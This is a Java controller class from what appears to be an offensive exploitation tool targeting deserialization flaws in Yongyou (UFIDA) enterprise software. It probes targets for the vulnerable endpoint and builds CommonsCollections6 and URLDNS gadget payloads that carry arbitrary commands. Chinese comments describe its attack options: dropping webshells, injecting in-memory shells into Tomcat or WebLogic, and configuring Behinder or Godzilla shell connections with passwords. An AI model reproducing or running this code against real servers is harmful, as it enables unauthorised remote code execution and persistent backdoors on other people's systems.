package com.droplab.Controller.Yongyou;

import com.droplab.Controller.Yongyou.Service.GetUnserializePayload;
import com.droplab.Controller.Yongyou.Service.YongyouCheckeURL;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.UnSerialize.SerializeFactory;
import org.jsoup.Connection;
import sun.misc.BASE64Encoder;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class YongyouController {
    /**
     * 用友反序列化接口探测
     */
    public String YongyouCheckURL(String url, String urldns){
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            HashMap hashMap = new HashMap();
            hashMap.put("url",url);
            hashMap.put("urldns",urldns);

            YongyouCheckeURL yongyouCheckeURL =(YongyouCheckeURL) Class.forName(getMap().get("YongyouCheckeURL")).newInstance();
            yongyouCheckeURL.setParams(hashMap);
            Connection.Response exploit = yongyouCheckeURL.exploit();
            if (exploit != null) {
                return new String(exploit.bodyAsBytes());
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }


    /**
     * 用友反序列化payload生成
     * @param
     * @return
     */
    public String GetUnserializePayload(String mOption,String rootPath, String mType, String mMiddle, String path, String mshellType, String password){
        try {
            HashMap hashMap = new HashMap();
            hashMap.put("mOption",mOption);  //攻击类型 落地webshell，注入内存马，命令执行
            if(!mType.equals("")){
                hashMap.put("mType",mType);  //中间件类型，tomcat ，weblogic
            }if(!mMiddle.equals("")){
                hashMap.put("mMiddle",mMiddle); // 内存马类型 filter valve servlet
            }if(!path.equals("")){
                hashMap.put("path",path);   //内存马路径
            }if(!mshellType.equals("")){
                hashMap.put("mshellType",mshellType);  //菜刀类型。冰蝎，哥斯拉
            }if(!password.equals("")){
                hashMap.put("password",password);  //连接密码
            }
            String filename=CommonUtils.RandomStr(8);
            hashMap.put("filename",filename);
            File file = new File(rootPath);
            if(file.exists()){
                hashMap.put("filepath", file.getAbsolutePath());
            }
            GetUnserializePayload getUnserializePayload =(GetUnserializePayload) Class.forName(getMap().get("GetUnserializePayload")).newInstance();
            getUnserializePayload.setParams(hashMap);
            Connection.Response exploit = getUnserializePayload.exploit();
            if (exploit != null) {
                return new String(exploit.bodyAsBytes());
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public String blind(String cmd){
        try {
            byte[] commonsCollections6s = SerializeFactory.instance().getObject("", "CommonsCollections6", cmd.getBytes(StandardCharsets.UTF_8));
            String encode = new BASE64Encoder().encode(commonsCollections6s);
            return encode;
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public String urldns(String url){
        try {
            byte[] commonsCollections6s = SerializeFactory.instance().getObject("", "URLDNS", url.getBytes(StandardCharsets.UTF_8));
            String encode = new BASE64Encoder().encode(commonsCollections6s);
            return encode;
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public Map<String, String> getMap() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("GetUnserializePayload", "com.droplab.Controller.Yongyou.Service.GetUnserializePayload");
        hashMap.put("YongyouCheckeURL", "com.droplab.Controller.Yongyou.Service.YongyouCheckeURL");
        return hashMap;
    }
}

